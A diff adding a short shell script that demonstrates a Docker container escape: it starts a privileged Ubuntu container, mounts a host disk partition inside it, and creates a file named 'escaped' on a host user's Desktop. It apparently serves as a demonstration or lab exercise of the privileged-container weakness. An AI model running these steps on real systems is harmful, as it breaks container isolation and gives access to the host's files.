@@ -1,0 +1,9 @@
+sudo docker run -it --privileged ubuntu bash
+mkdir /escape
+mount /dev/nvme0n1p8 /escape
+cd /escape/home/tryadovoi/Desktop/
+touch escaped
+exit
+
+
+
